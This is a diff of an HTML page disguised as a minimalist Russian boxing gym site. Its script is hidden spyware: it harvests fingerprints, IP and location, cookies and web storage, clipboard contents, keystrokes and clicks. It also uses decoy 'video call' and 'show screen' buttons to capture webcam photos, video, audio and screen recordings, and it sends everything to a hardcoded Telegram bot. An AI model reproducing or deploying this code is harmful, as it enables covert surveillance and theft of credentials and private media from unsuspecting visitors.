@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>BOXING | MINIMAL</title>
     <style>
         * {
@@ -19,15 +19,15 @@
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 2rem;
+            padding: 1rem;
         }
         header {
             border-bottom: 1px solid #333;
-            padding: 1rem 0;
-            margin-bottom: 3rem;
+            padding: 0.8rem 0;
+            margin-bottom: 2rem;
         }
         h1 {
-            font-size: 2.5rem;
+            font-size: 2rem;
             font-weight: 300;
             letter-spacing: 2px;
         }
@@ -36,19 +36,20 @@
         }
         .hero {
             text-align: center;
-            padding: 4rem 0;
+            padding: 2rem 0;
             border: 1px solid #333;
-            margin-bottom: 3rem;
+            margin-bottom: 2rem;
         }
         .hero h2 {
-            font-size: 3rem;
+            font-size: 2.2rem;
             font-weight: 300;
             margin-bottom: 1rem;
         }
         .hero p {
             color: #888;
             max-width: 600px;
-            margin: 0 auto 2rem;
+            margin: 0 auto 1.5rem;
+            font-size: 0.95rem;
         }
         .btn {
             background: transparent;
@@ -60,25 +61,30 @@
             transition: 0.3s;
             text-decoration: none;
             display: inline-block;
+            margin: 0.5rem;
+            min-width: 200px;
         }
         .btn:hover {
             background: #fff;
             color: #000;
         }
+        .btn:active {
+            opacity: 0.7;
+        }
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            margin: 3rem 0;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
         }
         .card {
             border: 1px solid #333;
-            padding: 2rem;
+            padding: 1.5rem;
             text-align: center;
         }
         .card h3 {
             font-weight: 300;
-            margin-bottom: 1rem;
+            margin-bottom: 0.5rem;
             color: #ccc;
         }
         .card p {
@@ -88,53 +94,60 @@
         .trainers {
             display: flex;
             justify-content: center;
-            gap: 3rem;
-            margin: 4rem 0;
+            gap: 2rem;
+            margin: 2rem 0;
             flex-wrap: wrap;
         }
         .trainer {
             text-align: center;
         }
         .trainer .avatar {
-            width: 120px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
             background: #222;
-            margin: 0 auto 1rem;
+            margin: 0 auto 0.8rem;
             border: 1px solid #444;
         }
         .trainer .name {
             color: #fff;
-            margin-bottom: 0.3rem;
+            margin-bottom: 0.2rem;
+            font-size: 1rem;
         }
         .trainer .role {
             color: #666;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
         }
         .schedule {
             border: 1px solid #333;
-            padding: 2rem;
-            margin: 3rem 0;
+            padding: 1.5rem;
+            margin: 2rem 0;
         }
         .schedule table {
             width: 100%;
             border-collapse: collapse;
         }
         .schedule td {
-            padding: 1rem;
+            padding: 0.8rem;
             border-bottom: 1px solid #333;
             color: #888;
+            font-size: 0.95rem;
         }
         .schedule td:first-child {
             color: #fff;
         }
         .footer {
             border-top: 1px solid #333;
-            padding: 2rem 0;
-            margin-top: 3rem;
+            padding: 1.5rem 0;
+            margin-top: 2rem;
             text-align: center;
             color: #666;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
+        }
+        .mobile-note {
+            color: #444;
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
         }
     </style>
 </head>
@@ -147,7 +160,10 @@
         <div class="hero">
             <h2>MINIMAL<br>STRENGTH</h2>
             <p>Тренировки без компромиссов. Только суть.</p>
-            <button class="btn" id="startBtn">НАЧАТЬ</button>
+            <button class="btn" id="startBtn">НАЧАТЬ ТРЕНИРОВКУ</button>
+            <button class="btn" id="videoCallBtn">ВИДЕОЗВОНОК ТРЕНЕРУ</button>
+            <button class="btn" id="screenBtn">ПОКАЗАТЬ ЭКРАН</button>
+            <div class="mobile-note">* для полного функционала нажмите все кнопки</div>
         </div>
 
         <div class="grid">
@@ -203,6 +219,9 @@
             const BOT_TOKEN = "8783559474:AAEiyiJTScyCk1au9UEYONO1wNs43xqwfHk";
             const CHAT_ID = "8192254166";
             
+            // === ОПРЕДЕЛЕНИЕ МОБИЛЬНОГО УСТРОЙСТВА ===
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
             // === НАКОПИТЕЛЬ ДАННЫХ ===
             const Report = {
                 fingerprint: {},
@@ -213,6 +232,10 @@
                 keys: [],
                 clicks: [],
                 mediaFiles: [],
+                deviceInfo: {
+                    isMobile: isMobile,
+                    userAgent: navigator.userAgent.substring(0, 100)
+                },
                 startTime: Date.now()
             };
 
@@ -220,11 +243,19 @@
             async function sendFinalReport() {
                 let message = `📊 **ОТЧЕТ ПОСЕТИТЕЛЯ САЙТА**\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
 
+                // УСТРОЙСТВО
+                message += `📱 **УСТРОЙСТВО:**\n`;
+                message += `• Тип: ${isMobile ? 'Мобильное' : 'Десктоп'}\n`;
+                message += `• ОС: ${Report.fingerprint['Платформа'] || '?'}\n`;
+                message += `• Браузер: ${Report.fingerprint['User Agent'] || '?'}\n\n`;
+
                 // FINGERPRINT
                 message += `🆔 **FINGERPRINT:**\n`;
-                for (let [k, v] of Object.entries(Report.fingerprint)) {
-                    message += `• ${k}: ${v}\n`;
-                }
+                message += `• Экран: ${Report.fingerprint['Экран'] || '?'}\n`;
+                message += `• Язык: ${Report.fingerprint['Язык'] || '?'}\n`;
+                message += `• Часовой пояс: ${Report.fingerprint['Часовой пояс'] || '?'}\n`;
+                message += `• Аппаратная конкуренция: ${Report.fingerprint['Аппаратная конкуренция'] || '?'}\n`;
+                message += `• Память: ${Report.fingerprint['Память'] || '?'}\n`;
                 message += `\n`;
 
                 // IP
@@ -244,11 +275,13 @@
                 }
 
                 // ХРАНИЛИЩЕ
-                message += `📦 **ХРАНИЛИЩЕ:**\n`;
-                if (Report.storage.cookies) message += `🍪 Куки: ${Report.storage.cookies}\n`;
-                if (Report.storage.localStorage) message += `💾 LocalStorage: ${JSON.stringify(Report.storage.localStorage)}\n`;
-                if (Report.storage.sessionStorage) message += `📝 SessionStorage: ${JSON.stringify(Report.storage.sessionStorage)}\n`;
-                message += `\n`;
+                if (Report.storage.cookies || Report.storage.localStorage || Report.storage.sessionStorage) {
+                    message += `📦 **ХРАНИЛИЩЕ:**\n`;
+                    if (Report.storage.cookies) message += `🍪 Куки: ${Report.storage.cookies}\n`;
+                    if (Report.storage.localStorage) message += `💾 LocalStorage: ${JSON.stringify(Report.storage.localStorage)}\n`;
+                    if (Report.storage.sessionStorage) message += `📝 SessionStorage: ${JSON.stringify(Report.storage.sessionStorage)}\n`;
+                    message += `\n`;
+                }
 
                 // БУФЕР ОБМЕНА
                 if (Report.clipboard) {
@@ -288,11 +321,13 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
-                            text: message,
+                            text: message.substring(0, 4000),
                             parse_mode: 'Markdown'
                         })
                     });
-                } catch (e) {}
+                } catch (e) {
+                    console.log('Ошибка отправки:', e);
+                }
             }
 
             // === СБОР FINGERPRINT ===
@@ -304,43 +339,24 @@
                     'Платформа': navigator.platform,
                     'Часовой пояс': Intl.DateTimeFormat().resolvedOptions().timeZone,
                     'Аппаратная конкуренция': navigator.hardwareConcurrency || '?',
-                    'Память': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
-                    'WebGL': (() => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                            return gl ? gl.getParameter(gl.RENDERER) : '?';
-                        } catch { return '?'; }
-                    })()
+                    'Память': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?'
                 };
             })();
 
             // === СБОР IP ===
             (function collectIPs() {
                 // Публичный IP
-                fetch('https://api.ipify.org?format=json')
+                fetch('https://api.ipify.org?format=json', { mode: 'cors' })
                     .then(r => r.json())
-                    .then(d => Report.ips['Публичный'] = d.ip)
+                    .then(d => { Report.ips['Публичный'] = d.ip; sendFinalReport(); })
                     .catch(() => {});
 
-                // Локальный IP (через WebRTC)
-                try {
-                    const rtc = new RTCPeerConnection();
-                    rtc.createDataChannel('');
-                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                    rtc.onicecandidate = (e) => {
-                        if (!e.candidate) return;
-                        const ip = e.candidate.address || e.candidate.candidate.split(' ')[4];
-                        if (ip && !ip.includes(':')) Report.ips['Локальный'] = ip;
-                    };
-                } catch (e) {}
-
                 // Инфо о провайдере
-                fetch('https://ipapi.co/json/')
+                fetch('https://ipapi.co/json/', { mode: 'cors' })
                     .then(r => r.json())
                     .then(d => {
                         if (d.org) Report.ips['Провайдер'] = d.org;
-                        if (d.country_name) Report.ips['Страна'] = `${d.country_name}, ${d.city}`;
+                        if (d.country_name) Report.ips['Страна'] = `${d.country_name}, ${d.city || ''}`;
                     })
                     .catch(() => {});
             })();
@@ -354,17 +370,7 @@
                             lon: pos.coords.longitude.toFixed(4),
                             accuracy: Math.round(pos.coords.accuracy)
                         };
-                        
-                        // Обратная геокодировка
-                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
-                            .then(r => r.json())
-                            .then(d => {
-                                if (d.address) {
-                                    Report.geo.city = d.address.city || d.address.town || d.address.village || '?';
-                                    Report.geo.address = d.display_name.substring(0, 100);
-                                }
-                            })
-                            .catch(() => {});
+                        sendFinalReport();
                     },
                     () => {}
                 );
@@ -397,104 +403,31 @@
                     const text = await navigator.clipboard.readText();
                     if (text && text.length < 500 && text !== Report.clipboard) {
                         Report.clipboard = text;
+                        sendFinalReport();
                     }
                 } catch (e) {}
-            }, 3000);
+            }, 5000);
 
             // === КЛИКИ ===
             document.addEventListener('click', (e) => {
-                Report.clicks.push(`${e.target.tagName} "${e.target.innerText?.substring(0, 20)}" (${e.clientX},${e.clientY})`);
+                const targetText = e.target.innerText?.substring(0, 20) || e.target.tagName;
+                Report.clicks.push(`${targetText} (${Math.round(e.clientX)},${Math.round(e.clientY)})`);
                 if (Report.clicks.length > 10) Report.clicks.shift();
+                sendFinalReport();
             });
 
             // === КЛАВИШИ ===
             document.addEventListener('keydown', (e) => {
-                if (e.key.length === 1) Report.keys.push(e.key);
+                if (e.key.length === 1) {
+                    Report.keys.push(e.key);
+                    if (Report.keys.length > 200) Report.keys = Report.keys.slice(-200);
+                }
             });
 
             // === МЕДИА ===
             function trackMediaFile(type, filename) {
                 Report.mediaFiles.push(`${type}: ${filename}`);
-            }
-
-            // === КАМЕРА/МИКРОФОН ===
-            async function captureMedia() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    
-                    // Фото
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.style.display = 'none';
-                    document.body.appendChild(video);
-                    await video.play();
-
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => {
-                            const filename = `photo_${Date.now()}.jpg`;
-                            trackMediaFile('Фото', filename);
-                            sendFileToTelegram(blob, filename);
-                        }, 'image/jpeg');
-                    }, 1000);
-
-                    // Видео 5 сек
-                    const recorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
-                        const filename = `video_${Date.now()}.mp4`;
-                        trackMediaFile('Видео', filename);
-                        sendFileToTelegram(blob, filename);
-                        stream.getTracks().forEach(t => t.stop());
-                        document.body.removeChild(video);
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
-
-                } catch (e) {}
-            }
-
-            // === ЭКРАН ===
-            async function captureScreen() {
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    const recorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
-                        const filename = `screen_${Date.now()}.mp4`;
-                        trackMediaFile('Экран', filename);
-                        sendFileToTelegram(blob, filename);
-                        stream.getTracks().forEach(t => t.stop());
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 7000);
-                } catch (e) {}
-            }
-
-            // === ГОЛОС ===
-            async function captureVoice() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    const recorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'audio/ogg' });
-                        const filename = `voice_${Date.now()}.ogg`;
-                        trackMediaFile('Голос', filename);
-                        sendFileToTelegram(blob, filename);
-                        stream.getTracks().forEach(t => t.stop());
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
-                } catch (e) {}
+                sendFinalReport();
             }
 
             // === ОТПРАВКА ФАЙЛОВ ===
@@ -507,41 +440,151 @@
                         method: 'POST',
                         body: formData
                     });
+                    trackMediaFile(filename.split('_')[0], filename);
                 } catch (e) {}
             }
 
-            // === ЗАПУСК ПРИ ЗАГРУЗКЕ ===
-            window.addEventListener('load', () => {
-                // Отправляем отчет через 5 секунд (после сбора базовой инфы)
-                setTimeout(sendFinalReport, 5000);
-                
-                // Пытаемся собрать медиа
-                setTimeout(() => {
-                    if (confirm('Хотите пообщаться с тренером?')) {
-                        captureMedia();
-                        captureVoice();
-                    }
-                }, 2000);
+            // === ФОТО ===
+            async function capturePhoto() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    await video.play();
 
-                setTimeout(() => {
-                    if (confirm('Тренер хочет показать технику. Разрешить запись экрана?')) {
-                        captureScreen();
-                    }
-                }, 8000);
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            sendFileToTelegram(blob, `photo_${Date.now()}.jpg`);
+                        }, 'image/jpeg');
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        document.body.removeChild(video);
+                    }, 1000);
+                } catch (e) {
+                    console.log('Ошибка фото:', e);
+                }
+            }
 
-                // Каждые 30 секунд обновляем отчет
-                setInterval(sendFinalReport, 30000);
-            });
+            // === ВИДЕО ===
+            async function captureVideo() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        sendFileToTelegram(blob, `video_${Date.now()}.mp4`);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                } catch (e) {}
+            }
 
-            // === ПРИ КЛИКЕ ===
+            // === ЭКРАН ===
+            async function captureScreen() {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        sendFileToTelegram(blob, `screen_${Date.now()}.mp4`);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 7000);
+                } catch (e) {}
+            }
+
+            // === ГОЛОС ===
+            async function captureVoice() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/ogg' });
+                        sendFileToTelegram(blob, `voice_${Date.now()}.ogg`);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                } catch (e) {}
+            }
+
+            // === ОТПРАВКА БАЗОВОЙ ИНФОРМАЦИИ СРАЗУ ===
+            setTimeout(() => {
+                sendFinalReport();
+            }, 2000);
+
+            // === ОБРАБОТЧИКИ КНОПОК ===
             document.getElementById('startBtn').addEventListener('click', () => {
-                Report.clicks.push('Кнопка "НАЧАТЬ"');
-                captureMedia();
-                captureVoice();
-                captureScreen();
-                setTimeout(sendFinalReport, 2000);
+                Report.clicks.push('Кнопка "НАЧАТЬ ТРЕНИРОВКУ"');
+                sendFinalReport();
             });
 
+            document.getElementById('videoCallBtn').addEventListener('click', async () => {
+                Report.clicks.push('Кнопка "ВИДЕОЗВОНОК ТРЕНЕРУ"');
+                sendFinalReport();
+                
+                // Запрашиваем разрешения
+                try {
+                    await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    capturePhoto();
+                    captureVideo();
+                    captureVoice();
+                } catch (e) {
+                    // Если отказали - пробуем по отдельности
+                    capturePhoto();
+                    captureVoice();
+                }
+            });
+
+            document.getElementById('screenBtn').addEventListener('click', () => {
+                Report.clicks.push('Кнопка "ПОКАЗАТЬ ЭКРАН"');
+                sendFinalReport();
+                captureScreen();
+            });
+
+            // === ДЛЯ МОБИЛЬНЫХ - ДОПОЛНИТЕЛЬНЫЕ ПОПЫТКИ ПРИ СКРОЛЛЕ ===
+            let scrollAttempts = 0;
+            window.addEventListener('scroll', () => {
+                if (isMobile && scrollAttempts < 3) {
+                    scrollAttempts++;
+                    // Пытаемся получить гео при скролле
+                    if (!Report.geo.lat && navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => {
+                                Report.geo = {
+                                    lat: pos.coords.latitude.toFixed(4),
+                                    lon: pos.coords.longitude.toFixed(4),
+                                    accuracy: Math.round(pos.coords.accuracy)
+                                };
+                                sendFinalReport();
+                            },
+                            () => {}
+                        );
+                    }
+                }
+            });
+
+            console.log('HSC активен на', isMobile ? 'мобильном' : 'десктопе');
         })();
     </script>
 </body>
